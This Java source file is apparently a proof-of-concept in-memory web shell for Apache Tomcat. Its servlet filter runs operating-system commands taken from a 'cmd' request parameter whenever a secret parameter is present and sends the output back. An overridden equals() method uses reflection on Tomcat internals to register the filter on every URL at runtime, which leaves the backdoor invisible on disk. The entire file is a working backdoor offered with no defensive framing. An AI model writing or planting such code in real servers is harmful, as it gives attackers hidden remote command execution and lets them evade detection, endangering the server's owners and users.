package com.xhstormr.app;

import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.util.LifecycleBase;

import javax.servlet.*;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.EnumSet;
import java.util.Optional;
import java.util.UUID;

public class TomcatShellFilter implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        boolean success = request.getParameter("34aa503f95bb") != null;
        String cmd = Optional.ofNullable(request.getParameter("cmd")).orElse("id");

        if (success) {
            PrintWriter writer = response.getWriter();
            try {
                for (String s : readProcessOutput(cmd)) writer.println(s);
            } catch (Exception e) {
                e.printStackTrace(writer);
            }
            return;
        }

        chain.doFilter(request, response);
    }

    private ArrayList<String> readProcessOutput(String command) throws IOException {
        ArrayList<String> list = new ArrayList<>();
        try (InputStream in = Runtime.getRuntime().exec(command).getInputStream();
             BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {
            for (String s; (s = reader.readLine()) != null; ) {
                list.add(s);
            }
        }
        return list;
    }

    @Override
    public boolean equals(Object obj) {
        try {
            WebappClassLoaderBase classLoader = (WebappClassLoaderBase) obj;
            StandardContext standardContext = (StandardContext) classLoader.getResources().getContext();
            ServletContext servletContext = standardContext.getServletContext();

            Field stateField = LifecycleBase.class.getDeclaredField("state");
            stateField.setAccessible(true);
            try {
                stateField.set(standardContext, LifecycleState.STARTING_PREP);

                servletContext
                        .addFilter(UUID.randomUUID().toString(), this)
                        .addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");

                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext);

                stateField.set(standardContext, LifecycleState.STARTED);
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void destroy() {
    }
}

/*
https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA
*/
